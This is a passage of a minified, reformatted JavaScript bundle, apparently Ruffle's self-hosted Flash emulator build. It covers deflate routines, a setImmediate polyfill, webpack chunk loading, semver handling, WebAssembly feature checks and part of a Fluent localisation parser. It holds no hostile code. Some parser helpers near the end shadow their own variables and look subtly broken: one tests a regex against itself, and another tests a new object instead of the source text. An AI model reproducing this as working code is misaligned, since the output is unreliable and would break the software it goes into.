          for (l[2 * e.heap[e.heap_max] + 1] = 0, t = e.heap_max + 1; t < 573; t++) v < (i = l[2 * l[2 * (r = e.heap[t]) + 1] + 1] + 1) && (i = v, g++), l[2 * r + 1] = i, u < r || (e.bl_count[i]++, o = 0, p <= r && (o = f[r - p]), s = l[2 * r], e.opt_len += s * (i + o), d && (e.static_len += s * (c[2 * r + 1] + o)));
          if (0 !== g) {
            do {
              for (i = v - 1; 0 === e.bl_count[i];) i--;
              e.bl_count[i]--, e.bl_count[i + 1] += 2, e.bl_count[v]--, g -= 2;
            } while (0 < g);
            for (i = v; 0 !== i; i--) for (r = e.bl_count[i]; 0 !== r;) u < (a = e.heap[--t]) || (l[2 * a + 1] !== i && (e.opt_len += (i - l[2 * a + 1]) * l[2 * a], l[2 * a + 1] = i), r--);
          }
        }(e, n), L(i, u, e.bl_count);
      }
      function V(e, n, t) {
        var r, a, i = -1, o = n[1], s = 0, l = 7, u = 4;
        for (0 === o && (l = 138, u = 3), n[2 * (t + 1) + 1] = 65535, r = 0; r <= t; r++) a = o, o = n[2 * (r + 1) + 1], ++s < l && a === o || (s < u ? e.bl_tree[2 * a] += s : 0 !== a ? (a !== i && e.bl_tree[2 * a]++, e.bl_tree[32]++) : s <= 10 ? e.bl_tree[34]++ : e.bl_tree[36]++, i = a, u = (s = 0) === o ? (l = 138, 3) : a === o ? (l = 6, 3) : (l = 7, 4));
      }
      function K(e, n, t) {
        var r, a, i = -1, o = n[1], s = 0, l = 7, u = 4;
        for (0 === o && (l = 138, u = 3), r = 0; r <= t; r++) if (a = o, o = n[2 * (r + 1) + 1], !(++s < l && a === o)) {
          if (s < u) for (; B(e, a, e.bl_tree), 0 != --s;) ; else 0 !== a ? (a !== i && (B(e, a, e.bl_tree), s--), B(e, 16, e.bl_tree), M(e, s - 3, 2)) : s <= 10 ? (B(e, 17, e.bl_tree), M(e, s - 3, 3)) : (B(e, 18, e.bl_tree), M(e, s - 11, 7));
          i = a, u = (s = 0) === o ? (l = 138, 3) : a === o ? (l = 6, 3) : (l = 7, 4);
        }
      }
      o(O);
      var G = false;
      function Y(e, n, t, a) {
        M(e, 0 + (a ? 1 : 0), 3), function (e, n, t, a) {
          N(e), q(e, t), q(e, ~t), r.arraySet(e.pending_buf, e.window, n, t, e.pending), e.pending += t;
        }(e, n, t);
      }
      t._tr_init = function (e) {
        G || (function () {
          var e, n, t, r, a, i = new Array(h + 1);
          for (r = t = 0; r < 28; r++) for (C[r] = t, e = 0; e < 1 << y[r]; e++) E[t++] = r;
          for (E[t - 1] = r, r = a = 0; r < 16; r++) for (O[r] = a, e = 0; e < 1 << x[r]; e++) j[a++] = r;
          for (a >>= 7; r < d; r++) for (O[r] = a << 7, e = 0; e < 1 << x[r] - 7; e++) j[256 + a++] = r;
          for (n = 0; n <= h; n++) i[n] = 0;
          for (e = 0; e <= 143;) z[2 * e + 1] = 8, e++, i[8]++;
          for (; e <= 255;) z[2 * e + 1] = 9, e++, i[9]++;
          for (; e <= 279;) z[2 * e + 1] = 7, e++, i[7]++;
          for (; e <= 287;) z[2 * e + 1] = 8, e++, i[8]++;
          for (L(z, 287, i), e = 0; e < d; e++) S[2 * e + 1] = 5, S[2 * e] = W(e, 5);
          A = new D(z, y, 257, c, h), I = new D(S, x, 0, d, h), F = new D(new Array(0), R, 0, 19, 7);
        }(), G = true), e.l_desc = new P(e.dyn_ltree, A), e.d_desc = new P(e.dyn_dtree, I), e.bl_desc = new P(e.bl_tree, F), e.bi_buf = 0, e.bi_valid = 0, $(e);
      }, t._tr_stored_block = Y, t._tr_flush_block = function (e, n, t, r) {
        var o, s, l = 0;
        0 < e.level ? (2 === e.strm.data_type && (e.strm.data_type = function (e) {
          var n, t = 4093624447;
          for (n = 0; n <= 31; n++, t >>>= 1) if (1 & t && 0 !== e.dyn_ltree[2 * n]) return 0;
          if (0 !== e.dyn_ltree[18] || 0 !== e.dyn_ltree[20] || 0 !== e.dyn_ltree[26]) return 1;
          for (n = 32; n < u; n++) if (0 !== e.dyn_ltree[2 * n]) return 1;
          return 0;
        }(e)), J(e, e.l_desc), J(e, e.d_desc), l = function (e) {
          var n;
          for (V(e, e.dyn_ltree, e.l_desc.max_code), V(e, e.dyn_dtree, e.d_desc.max_code), J(e, e.bl_desc), n = 18; 3 <= n && 0 === e.bl_tree[2 * _[n] + 1]; n--) ;
          return e.opt_len += 3 * (n + 1) + 5 + 5 + 4, n;
        }(e), o = e.opt_len + 3 + 7 >>> 3, (s = e.static_len + 3 + 7 >>> 3) <= o && (o = s)) : o = s = t + 5, t + 4 <= o && -1 !== n ? Y(e, n, t, r) : 4 === e.strategy || s === o ? (M(e, 2 + (r ? 1 : 0), 3), H(e, z, S)) : (M(e, 4 + (r ? 1 : 0), 3), function (e, n, t, r) {
          var a;
          for (M(e, n - 257, 5), M(e, t - 1, 5), M(e, r - 4, 4), a = 0; a < r; a++) M(e, e.bl_tree[2 * _[a] + 1], 3);
          K(e, e.dyn_ltree, n - 1), K(e, e.dyn_dtree, t - 1);
        }(e, e.l_desc.max_code + 1, e.d_desc.max_code + 1, l + 1), H(e, e.dyn_ltree, e.dyn_dtree)), $(e), r && N(e);
      }, t._tr_tally = function (e, n, t) {
        return e.pending_buf[e.d_buf + 2 * e.last_lit] = n >>> 8 & 255, e.pending_buf[e.d_buf + 2 * e.last_lit + 1] = 255 & n, e.pending_buf[e.l_buf + e.last_lit] = 255 & t, e.last_lit++, 0 === n ? e.dyn_ltree[2 * t]++ : (e.matches++, n--, e.dyn_ltree[2 * (E[t] + u + 1)]++, e.dyn_dtree[2 * T(n)]++), e.last_lit === e.lit_bufsize - 1;
      }, t._tr_align = function (e) {
        M(e, 2, 3), B(e, 256, z), function (e) {
          16 === e.bi_valid ? (q(e, e.bi_buf), e.bi_buf = 0, e.bi_valid = 0) : 8 <= e.bi_valid && (e.pending_buf[e.pending++] = 255 & e.bi_buf, e.bi_buf >>= 8, e.bi_valid -= 8);
        }(e);
      };
    }, {"../utils/common": 41}], 53: [function (e, n, t) {
      "use strict";
      n.exports = function () {
        this.input = null, this.next_in = 0, this.avail_in = 0, this.total_in = 0, this.output = null, this.next_out = 0, this.avail_out = 0, this.total_out = 0, this.msg = "", this.state = null, this.data_type = 2, this.adler = 0;
      };
    }, {}], 54: [function (e, n, r) {
      (function (e) {
        !function (e, n) {
          "use strict";
          if (!e.setImmediate) {
            var t, r, a, i, o = 1, s = {}, l = false, u = e.document, c = Object.getPrototypeOf && Object.getPrototypeOf(e);
            c = c && c.setTimeout ? c : e, t = "[object process]" === {}.toString.call(e.process) ? function (e) {
              process.nextTick(function () {
                f(e);
              });
            } : function () {
              if (e.postMessage && !e.importScripts) {
                var n = true, t = e.onmessage;
                return e.onmessage = function () {
                  n = false;
                }, e.postMessage("", "*"), e.onmessage = t, n;
              }
            }() ? (i = "setImmediate$" + Math.random() + "$", e.addEventListener ? e.addEventListener("message", m, false) : e.attachEvent("onmessage", m), function (n) {
              e.postMessage(i + n, "*");
            }) : e.MessageChannel ? ((a = new MessageChannel).port1.onmessage = function (e) {
              f(e.data);
            }, function (e) {
              a.port2.postMessage(e);
            }) : u && "onreadystatechange" in u.createElement("script") ? (r = u.documentElement, function (e) {
              var n = u.createElement("script");
              n.onreadystatechange = function () {
                f(e), n.onreadystatechange = null, r.removeChild(n), n = null;
              }, r.appendChild(n);
            }) : function (e) {
              setTimeout(f, 0, e);
            }, c.setImmediate = function (e) {
              "function" != typeof e && (e = new Function("" + e));
              for (var n = new Array(arguments.length - 1), r = 0; r < n.length; r++) n[r] = arguments[r + 1];
              var a = {callback: e, args: n};
              return s[o] = a, t(o), o++;
            }, c.clearImmediate = d;
          }
          function d(e) {
            delete s[e];
          }
          function f(e) {
            if (l) setTimeout(f, 0, e); else {
              var t = s[e];
              if (t) {
                l = true;
                try {
                  !function (e) {
                    var t = e.callback, r = e.args;
                    switch (r.length) {
                      case 0:
                        t();
                        break;
                      case 1:
                        t(r[0]);
                        break;
                      case 2:
                        t(r[0], r[1]);
                        break;
                      case 3:
                        t(r[0], r[1], r[2]);
                        break;
                      default:
                        t.apply(n, r);
                    }
                  }(t);
                } finally {
                  d(e), l = false;
                }
              }
            }
          }
          function m(n) {
            n.source === e && "string" == typeof n.data && 0 === n.data.indexOf(i) && f(+n.data.slice(i.length));
          }
        }("undefined" == typeof self ? undefined === e ? this : e : self);
      }.call(this, undefined !== t.g ? t.g : "undefined" != typeof self ? self : "undefined" != typeof window ? window : {}));
    }, {}]}, {}, [10])(10);
  }, 899: (e, n, t) => {
    "use strict";
    e.exports = t.p + "6c2b1b2b5bfe2df2c30a.wasm";
  }, 878: (e, n, t) => {
    "use strict";
    e.exports = t.p + "ac20e389529269f07a8b.wasm";
  }}, r = {};
  function a(e) {
    var n = r[e];
    if (undefined !== n) return n.exports;
    var i = r[e] = {id: e, loaded: false, exports: {}};
    return t[e](i, i.exports, a), i.loaded = true, i.exports;
  }
  a.m = t, a.n = e => {
    var n = e && e.__esModule ? () => e.default : () => e;
    return a.d(n, {a: n}), n;
  }, a.d = (e, n) => {
    for (var t in n) a.o(n, t) && !a.o(e, t) && Object.defineProperty(e, t, {enumerable: true, get: n[t]});
  }, a.f = {}, a.e = e => Promise.all(Object.keys(a.f).reduce((n, t) => (a.f[t](e, n), n), [])), a.u = e => "core.ruffle." + {159: "f679a9cca02e131ea881", 339: "67bc37f4e63c43ff9c64"}[e] + ".js", a.g = function () {
    if ("object" == typeof globalThis) return globalThis;
    try {
      return this || new Function("return this")();
    } catch (e) {
      if ("object" == typeof window) return window;
    }
  }(), a.hmd = e => ((e = Object.create(e)).children || (e.children = []), Object.defineProperty(e, "exports", {enumerable: true, set: () => {
    throw new Error("ES Modules may not assign module.exports or exports.*, Use ESM export syntax, instead: " + e.id);
  }}), e), a.o = (e, n) => Object.prototype.hasOwnProperty.call(e, n), e = {}, n = "ruffle-selfhosted:", a.l = (t, r, i, o) => {
    if (e[t]) e[t].push(r); else {
      var s, l;
      if (undefined !== i) for (var u = document.getElementsByTagName("script"), c = 0; c < u.length; c++) {
        var d = u[c];
        if (d.getAttribute("src") == t || d.getAttribute("data-webpack") == n + i) {
          s = d;
          break;
        }
      }
      s || (l = true, (s = document.createElement("script")).charset = "utf-8", s.timeout = 120, a.nc && s.setAttribute("nonce", a.nc), s.setAttribute("data-webpack", n + i), s.src = t), e[t] = [r];
      var f = (n, r) => {
        s.onerror = s.onload = null, clearTimeout(m);
        var a = e[t];
        if (delete e[t], s.parentNode && s.parentNode.removeChild(s), a && a.forEach(e => e(r)), n) return n(r);
      }, m = setTimeout(f.bind(null, undefined, {type: "timeout", target: s}), 12e4);
      s.onerror = f.bind(null, s.onerror), s.onload = f.bind(null, s.onload), l && document.head.appendChild(s);
    }
  }, a.r = e => {
    "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {value: "Module"}), Object.defineProperty(e, "__esModule", {value: true});
  }, a.p = "", (() => {
    a.b = document.baseURI || self.location.href;
    var e = {179: 0};
    a.f.j = (n, t) => {
      var r = a.o(e, n) ? e[n] : undefined;
      if (0 !== r) if (r) t.push(r[2]); else {
        var i = new Promise((t, a) => r = e[n] = [t, a]);
        t.push(r[2] = i);
        var o = a.p + a.u(n), s = new Error;
        a.l(o, t => {
          if (a.o(e, n) && (0 !== (r = e[n]) && (e[n] = undefined), r)) {
            var i = t && ("load" === t.type ? "missing" : t.type), o = t && t.target && t.target.src;
            s.message = "Loading chunk " + n + " failed.\n(" + i + ": " + o + ")", s.name = "ChunkLoadError", s.type = i, s.request = o, r[1](s);
          }
        }, "chunk-" + n, n);
      }
    };
    var n = (n, t) => {
      var r, i, [o, s, l] = t, u = 0;
      if (o.some(n => 0 !== e[n])) {
        for (r in s) a.o(s, r) && (a.m[r] = s[r]);
        l && l(a);
      }
      for (n && n(t); u < o.length; u++) i = o[u], a.o(e, i) && e[i] && e[i][0](), e[i] = 0;
    }, t = self.webpackChunkruffle_selfhosted = self.webpackChunkruffle_selfhosted || [];
    t.forEach(n.bind(null, 0)), t.push = n.bind(null, t.push.bind(t));
  })(), (() => {
    "use strict";
    class e {
      constructor(e, n, t, r, a) {
        this.major = e, this.minor = n, this.patch = t, this.prIdent = r, this.buildIdent = a;
      }
      static fromSemver(n) {
        const t = n.split("+"), r = t[0].split("-"), a = r[0].split("."), i = parseInt(a[0], 10);
        let o = 0, s = 0, l = null, u = null;
        return undefined !== a[1] && (o = parseInt(a[1], 10)), undefined !== a[2] && (s = parseInt(a[2], 10)), undefined !== r[1] && (l = r[1].split(".")), undefined !== t[1] && (u = t[1].split(".")), new e(i, o, s, l, u);
      }
      isCompatibleWith(e) {
        return 0 !== this.major && this.major === e.major || 0 === this.major && 0 === e.major && 0 !== this.minor && this.minor === e.minor || 0 === this.major && 0 === e.major && 0 === this.minor && 0 === e.minor && 0 !== this.patch && this.patch === e.patch;
      }
      hasPrecedenceOver(e) {
        if (this.major > e.major) return true;
        if (this.major < e.major) return false;
        if (this.minor > e.minor) return true;
        if (this.minor < e.minor) return false;
        if (this.patch > e.patch) return true;
        if (this.patch < e.patch) return false;
        if (null === this.prIdent && null !== e.prIdent) return true;
        if (null !== this.prIdent && null === e.prIdent) return false;
        if (null !== this.prIdent && null !== e.prIdent) {
          const n = /^[0-9]*$/;
          for (let t = 0; t < this.prIdent.length && t < e.prIdent.length; t += 1) {
            const r = n.test(e.prIdent[t]), a = n.test(this.prIdent[t]);
            if (!a && r) return true;
            if (a && r) {
              const n = parseInt(this.prIdent[t], 10), r = parseInt(e.prIdent[t], 10);
              if (n > r) return true;
              if (n < r) return false;
            } else {
              if (a && !r) return false;
              if (!a && !r) {
                if (this.prIdent[t] > e.prIdent[t]) return true;
                if (this.prIdent[t] < e.prIdent[t]) return false;
              }
            }
          }
          if (this.prIdent.length > e.prIdent.length) return true;
          if (this.prIdent.length < e.prIdent.length) return false;
        }
        if (null !== this.buildIdent && null === e.buildIdent) return true;
        if (null === this.buildIdent && null !== e.buildIdent) return false;
        if (null !== this.buildIdent && null !== e.buildIdent) {
          const n = /^[0-9]*$/;
          for (let t = 0; t < this.buildIdent.length && t < e.buildIdent.length; t += 1) {
            const r = n.test(this.buildIdent[t]), a = n.test(e.buildIdent[t]);
            if (!r && a) return true;
            if (r && a) {
              const n = parseInt(this.buildIdent[t], 10), r = parseInt(e.buildIdent[t], 10);
              if (n > r) return true;
              if (n < r) return false;
            } else {
              if (r && !a) return false;
              if (!r && !a) {
                if (this.buildIdent[t] > e.buildIdent[t]) return true;
                if (this.buildIdent[t] < e.buildIdent[t]) return false;
              }
            }
          }
          return this.buildIdent.length > e.buildIdent.length;
        }
        return false;
      }
      isEqual(e) {
        return this.major === e.major && this.minor === e.minor && this.patch === e.patch;
      }
      isStableOrCompatiblePrerelease(e) {
        return null === e.prIdent || this.major === e.major && this.minor === e.minor && this.patch === e.patch;
      }
    }
    class n {
      constructor(e) {
        this.requirements = e;
      }
      satisfiedBy(e) {
        for (const n of this.requirements) {
          let t = true;
          for (const {comparator: r, version: a} of n) t = t && a.isStableOrCompatiblePrerelease(e), "" === r || "=" === r ? t = t && a.isEqual(e) : ">" === r ? t = t && e.hasPrecedenceOver(a) : ">=" === r ? t = t && (e.hasPrecedenceOver(a) || a.isEqual(e)) : "<" === r ? t = t && a.hasPrecedenceOver(e) : "<=" === r ? t = t && (a.hasPrecedenceOver(e) || a.isEqual(e)) : "^" === r && (t = t && a.isCompatibleWith(e));
          if (t) return true;
        }
        return false;
      }
      static fromRequirementString(t) {
        const r = t.split(" ");
        let a = [];
        const i = [];
        for (const n of r) if ("||" === n) a.length > 0 && (i.push(a), a = []); else if (n.length > 0) {
          const t = /[0-9]/.exec(n);
          if (t) {
            const r = n.slice(0, t.index).trim(), i = e.fromSemver(n.slice(t.index).trim());
            a.push({comparator: r, version: i});
          }
        }
        return a.length > 0 && i.push(a), new n(i);
      }
    }
    const t = async () => WebAssembly.validate(new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 4, 1, 96, 0, 0, 3, 2, 1, 0, 5, 3, 1, 0, 1, 10, 14, 1, 12, 0, 65, 0, 65, 0, 65, 0, 252, 10, 0, 0, 11])), r = async () => WebAssembly.validate(new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 4, 1, 96, 0, 0, 3, 2, 1, 0, 10, 7, 1, 5, 0, 208, 112, 26, 11])), i = async () => WebAssembly.validate(new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 4, 1, 96, 0, 0, 3, 2, 1, 0, 10, 12, 1, 10, 0, 67, 0, 0, 0, 0, 252, 0, 26, 11])), o = async () => WebAssembly.validate(new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 4, 1, 96, 0, 0, 3, 2, 1, 0, 10, 8, 1, 6, 0, 65, 0, 192, 26, 11])), s = async () => WebAssembly.validate(new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 96, 0, 1, 123, 3, 2, 1, 0, 10, 10, 1, 8, 0, 65, 0, 253, 15, 253, 98, 11]));
    function l(e) {
      const n = "function" == typeof Function.prototype.toString ? Function.prototype.toString() : null;
      return "string" == typeof n && n.indexOf("[native code]") >= 0 && Function.prototype.toString.call(e).indexOf("[native code]") >= 0;
    }
    function u() {
      "function" == typeof Array.prototype.reduce && l(Array.prototype.reduce) || Object.defineProperty(Array.prototype, "reduce", {value(...e) {
        if (0 === e.length && window.Prototype && window.Prototype.Version && window.Prototype.Version < "1.6.1") return this.length > 1 ? this : this[0];
        const n = e[0];
        if (null === this) throw new TypeError("Array.prototype.reduce called on null or undefined");
        if ("function" != typeof n) throw new TypeError(`${n} is not a function`);
        const t = Object(this), r = t.length >>> 0;
        let a, i = 0;
        if (e.length >= 2) a = e[1]; else {
          for (; i < r && !(i in t);) i++;
          if (i >= r) throw new TypeError("Reduce of empty array with no initial value");
          a = t[i++];
        }
        for (; i < r;) i in t && (a = n(a, t[i], i, t)), i++;
        return a;
      }}), "function" == typeof Window && l(Window) || "function" == typeof window.constructor && l(window.constructor) && (window.Window = window.constructor), undefined !== window.Reflect && null !== window.Reflect || (window.Reflect = {}), "function" != typeof Reflect.get && Object.defineProperty(Reflect, "get", {value: (e, n) => e[n]}), "function" != typeof Reflect.set && Object.defineProperty(Reflect, "set", {value(e, n, t) {
        e[n] = t;
      }}), "function" != typeof Reflect.has && Object.defineProperty(Reflect, "has", {value: (e, n) => n in e}), "function" != typeof Reflect.ownKeys && Object.defineProperty(Reflect, "ownKeys", {value: e => [...Object.getOwnPropertyNames(e), ...Object.getOwnPropertySymbols(e)]});
    }
    let c = null, d = false;
    try {
      if (undefined !== document.currentScript && null !== document.currentScript && "src" in document.currentScript && "" !== document.currentScript.src) {
        let e = document.currentScript.src;
        e.endsWith(".js") || e.endsWith("/") || (e += "/"), c = new URL(".", e), d = c.protocol.includes("extension");
      }
    } catch (e) {
      console.warn("Unable to get currentScript URL");
    }
    function f(e) {
      var n;
      let t = null !== (n = null == c ? undefined : c.href) && undefined !== n ? n : "";
      return !d && "publicPath" in e && null !== e.publicPath && undefined !== e.publicPath && (t = e.publicPath), "" === t || t.endsWith("/") || (t += "/"), t;
    }
    let m = null;
    async function h(e, n, l, c) {
      return null === m && (m = async function (e, n) {
        var l;
        u();
        const c = (await Promise.all([t(), s(), i(), o(), r()])).every(Boolean);
        c || console.log("Some WebAssembly extensions are NOT available, falling back to the vanilla WebAssembly module");
        try {
          a.p = f(e);
        } catch (e) {}
        const {default: d, Ruffle: m} = await (c ? a.e(339).then(a.bind(a, 339)) : a.e(159).then(a.bind(a, 159)));
        let h;
        const p = c ? new URL(a(899), a.b) : new URL(a(878), a.b), v = await fetch(p), g = "function" == typeof ReadableStream;
        if (n && g) {
          const e = (null === (l = null == v ? undefined : v.headers) || undefined === l ? undefined : l.get("content-length")) || "";
          let t = 0;
          const r = parseInt(e);
          h = new Response(new ReadableStream({async start(e) {
            var a;
            const i = null === (a = v.body) || undefined === a ? undefined : a.getReader();
            if (!i) throw "Response had no body";
            for (n(t, r);;) {
              const {done: a, value: o} = await i.read();
              if (a) break;
              (null == o ? undefined : o.byteLength) && (t += null == o ? undefined : o.byteLength), e.enqueue(o), n(t, r);
            }
            e.close();
          }}), v);
        } else h = v;
        return await d(h), m;
      }(l, c)), new (await m)(e, n, l);
    }
    class p {
      constructor(e) {
        this.value = e;
      }
      valueOf() {
        return this.value;
      }
    }
    class v extends p {
      constructor(e = "???") {
        super(e);
      }
      toString(e) {
        return `{${this.value}}`;
      }
    }
    class g extends p {
      constructor(e, n = {}) {
        super(e), this.opts = n;
      }
      toString(e) {
        try {
          return e.memoizeIntlObject(Intl.NumberFormat, this.opts).format(this.value);
        } catch (n) {
          return e.reportError(n), this.value.toString(10);
        }
      }
    }
    class b extends p {
      constructor(e, n = {}) {
        super(e), this.opts = n;
      }
      toString(e) {
        try {
          return e.memoizeIntlObject(Intl.DateTimeFormat, this.opts).format(this.value);
        } catch (n) {
          return e.reportError(n), new Date(this.value).toISOString();
        }
      }
    }
    const w = 100, k = "⁨", y = "⁩";
    function R(e, n, t) {
      return n[t] ? j(e, n[t].value) : (e.reportError(new RangeError("No default")), new v);
    }
    function _(e, n) {
      const t = [], r = Object.create(null);
      for (const a of n) "narg" === a.type ? r[a.name] = z(e, a.value) : t.push(z(e, a));
      return {positional: t, named: r};
    }
    function z(e, n) {
      switch (n.type) {
        case "str":
          return n.value;
        case "num":
          return new g(n.value, {minimumFractionDigits: n.precision});
        case "var":
          return function (e, {name: n}) {
            let t;
            if (e.params) {
              if (!Object.prototype.hasOwnProperty.call(e.params, n)) return new v(`$${n}`);
              t = e.params[n];
            } else {
              if (!e.args || !Object.prototype.hasOwnProperty.call(e.args, n)) return e.reportError(new ReferenceError(`Unknown variable: $${n}`)), new v(`$${n}`);
              t = e.args[n];
            }
            if (t instanceof p) return t;
            switch (typeof t) {
              case "string":
                return t;
              case "number":
                return new g(t);
              case "object":
                if (t instanceof Date) return new b(t.getTime());
              default:
                return e.reportError(new TypeError(`Variable type not supported: $${n}, ${typeof t}`)), new v(`$${n}`);
            }
          }(e, n);
        case "mesg":
          return function (e, {name: n, attr: t}) {
            const r = e.bundle._messages.get(n);
            if (!r) return e.reportError(new ReferenceError(`Unknown message: ${n}`)), new v(n);
            if (t) {
              const a = r.attributes[t];
              return a ? j(e, a) : (e.reportError(new ReferenceError(`Unknown attribute: ${t}`)), new v(`${n}.${t}`));
            }
            return r.value ? j(e, r.value) : (e.reportError(new ReferenceError(`No value: ${n}`)), new v(n));
          }(e, n);
        case "term":
          return function (e, {name: n, attr: t, args: r}) {
            const a = `-${n}`, i = e.bundle._terms.get(a);
            if (!i) return e.reportError(new ReferenceError(`Unknown term: ${a}`)), new v(a);
            if (t) {
              const n = i.attributes[t];
              if (n) {
                e.params = _(e, r).named;
                const t = j(e, n);
                return e.params = null, t;
              }
              return e.reportError(new ReferenceError(`Unknown attribute: ${t}`)), new v(`${a}.${t}`);
            }
            e.params = _(e, r).named;
            const o = j(e, i.value);
            return e.params = null, o;
          }(e, n);
        case "func":
          return function (e, {name: n, args: t}) {
            let r = e.bundle._functions[n];
            if (!r) return e.reportError(new ReferenceError(`Unknown function: ${n}()`)), new v(`${n}()`);
            if ("function" != typeof r) return e.reportError(new TypeError(`Function ${n}() is not callable`)), new v(`${n}()`);
            try {
              let n = _(e, t);
              return r(n.positional, n.named);
            } catch (t) {
              return e.reportError(t), new v(`${n}()`);
            }
          }(e, n);
        case "select":
          return function (e, {selector: n, variants: t, star: r}) {
            let a = z(e, n);
            if (a instanceof v) return R(e, t, r);
            for (const n of t) if (z(e, n.key) === a || (z(e, n.key) instanceof g && a instanceof g && z(e, n.key).value === a.value || a instanceof g && "string" == typeof z(e, n.key) && z(e, n.key) === e.memoizeIntlObject(Intl.PluralRules, a.opts).select(a.value))) return j(e, n.value);
            return R(e, t, r);
          }(e, n);
        default:
          return new v;
      }
    }
    function S(e, n) {
      if (e.dirty.has(n)) return e.reportError(new RangeError("Cyclic reference")), new v;
      e.dirty.add(n);
      const t = [], r = e.bundle._useIsolating && n.length > 1;
      for (const a of n) if ("string" != typeof a) {
        if (e.placeables++, e.placeables > w) throw e.dirty.delete(n), new RangeError(`Too many placeables expanded: ${e.placeables}, max allowed is ${w}`);
        r && t.push(k), t.push(z(e, a).toString(e)), r && t.push(y);
      } else t.push(e.bundle._transform(a));
      return e.dirty.delete(n), t.join("");
    }
    function j(e, n) {
      return "string" == typeof n ? e.bundle._transform(n) : S(e, n);
    }
    class E {
      constructor(e, n, t) {
        this.dirty = new WeakSet, this.params = null, this.placeables = 0, this.bundle = e, this.errors = n, this.args = t;
      }
      reportError(e) {
        if (!(this.errors && e instanceof Error)) throw e;
        this.errors.push(e);
      }
      memoizeIntlObject(e, n) {
        let t = this.bundle._intls.get(e);
        t || (t = {}, this.bundle._intls.set(e, t));
        let r = JSON.stringify(n);
        return t[r] || (t[r] = new e(this.bundle.locales, n)), t[r];
      }
    }
    function C(e, n) {
      const t = Object.create(null);
      for (const [r, a] of Object.entries(e)) n.includes(r) && (t[r] = a.valueOf());
      return t;
    }
    const A = ["unitDisplay", "currencyDisplay", "useGrouping", "minimumIntegerDigits", "minimumFractionDigits", "maximumFractionDigits", "minimumSignificantDigits", "maximumSignificantDigits"];
    function I(e, n) {
      let t = e[0];
      if (t instanceof v) return new v(`NUMBER(${t.valueOf()})`);
      if (t instanceof g) return new g(t.valueOf(), {...t.opts, ...C(n, A)});
      if (t instanceof b) return new g(t.valueOf(), {...C(n, A)});
      throw new TypeError("Invalid argument to NUMBER");
    }
    const F = ["dateStyle", "timeStyle", "fractionalSecondDigits", "dayPeriod", "hour12", "weekday", "era", "year", "month", "day", "hour", "minute", "second", "timeZoneName"];
    function O(e, n) {
      let t = e[0];
      if (t instanceof v) return new v(`DATETIME(${t.valueOf()})`);
      if (t instanceof b) return new b(t.valueOf(), {...t.opts, ...C(n, F)});
      if (t instanceof g) return new b(t.valueOf(), {...C(n, F)});
      throw new TypeError("Invalid argument to DATETIME");
    }
    const D = new Map;
    class P {
      constructor(e, {functions: n, useIsolating: t = true, transform: r = e => e} = {}) {
        this._terms = new Map, this._messages = new Map, this.locales = Array.isArray(e) ? e : [e], this._functions = {NUMBER: I, DATETIME: O, ...n}, this._useIsolating = t, this._transform = r, this._intls = function (e) {
          const n = Array.isArray(e) ? e.join(" ") : e;
          let t = D.get(n);
          return undefined === t && (t = new Map, D.set(n, t)), t;
        }(e);
      }
      hasMessage(e) {
        return this._messages.has(e);
      }
      getMessage(e) {
        return this._messages.get(e);
      }
      addResource(e, {allowOverrides: n = false} = {}) {
        const t = [];
        for (let r = 0; r < e.body.length; r++) {
          let a = e.body[r];
          if (a.id.startsWith("-")) {
            if (false === n && this._terms.has(a.id)) {
              t.push(new Error(`Attempt to override an existing term: "${a.id}"`));
              continue;
            }
            this._terms.set(a.id, a);
          } else {
            if (false === n && this._messages.has(a.id)) {
              t.push(new Error(`Attempt to override an existing message: "${a.id}"`));
              continue;
            }
            this._messages.set(a.id, a);
          }
        }
        return t;
      }
      formatPattern(e, n = null, t = null) {
        if ("string" == typeof e) return this._transform(e);
        let r = new E(this, t, n);
        try {
          return S(r, e).toString(r);
        } catch (e) {
          if (r.errors && e instanceof Error) return r.errors.push(e), (new v).toString(r);
          throw e;
        }
      }
    }
    const T = /^(-?[a-zA-Z][\w-]*) *= */gm, q = /\.([a-zA-Z][\w-]*) *= */y, M = /\*?\[/y, B = /(-?[0-9]+(?:\.([0-9]+))?)/y, W = /([a-zA-Z][\w-]*)/y, L = /([$-])?([a-zA-Z][\w-]*)(?:\.([a-zA-Z][\w-]*))?/y, $ = /^[A-Z][A-Z0-9_-]*$/, N = /([^{}\n\r]+)/y, U = /([^\\"\n\r]*)/y, Z = /\\([\\"])/y, H = /\\u([a-fA-F0-9]{4})|\\U([a-fA-F0-9]{6})/y, J = /^\n+/, V = / +$/, K = / *\r?\n/g, G = /( *)$/, Y = /{\s*/y, X = /\s*}/y, Q = /\[\s*/y, ee = /\s*] */y, ne = /\s*\(\s*/y, te = /\s*->\s*/y, re = /\s*:\s*/y, ae = /\s*,?\s*/y, ie = /\s+/y;
    class oe {
      constructor(e) {
        this.body = [], T.lastIndex = 0;
        let n = 0;
        for (;;) {
          let t = T.exec(e);
          if (null === t) break;
          n = T.lastIndex;
          try {
            this.body.push(s(t[1]));
          } catch (e) {
            if (e instanceof SyntaxError) continue;
            throw e;
          }
        }
        function r(t, r) {
          if (e[n] === t) return n++, true;
          if (r) throw new r(`Expected ${t}`);
          return false;
        }
        function a(e, r) {
          if (e.lastIndex = n, e.test(e)) return n = e.lastIndex, true;
          if (r) throw new r(`Expected ${e.toString()}`);
          return false;
        }
        function i(t) {
          t.lastIndex = n;
          let r = t.exec(e);
          if (null === r) throw new SyntaxError(`Expected ${t.toString()}`);
          return n = t.lastIndex, r;
        }
        function s(e) {
          let n = l(), r = function () {
            let e = Object.create(null);
            for (; q.lastIndex = n, q.test(e);) {
              let n = i(q)[1], t = l();
              if (null === t) throw new SyntaxError("Expected attribute value");
              e[n] = t;
            }
            return e;
          }();
          if (null === n && 0 === Object.keys(r).length) throw new SyntaxError("Expected message value or attributes");
          return {id: e, value: n, attributes: r};
        }
        function l() {
          let r;
          if ((N.lastIndex = n, N.test(e)) && (r = i(N)[1]), "{" === e[n] || "}" === e[n]) return u(r ? [r] : [], Infinity);
          let a = g();
          return a ? r ? u([r, a], a.length) : (a.value = a.value.replace(J, ""), u([a], a.length)) : r ? r.replace(V, "") : null;
        }
        function u(r = [], a) {
          for (;;) {
            if (N.lastIndex = n, N.test(e)) {
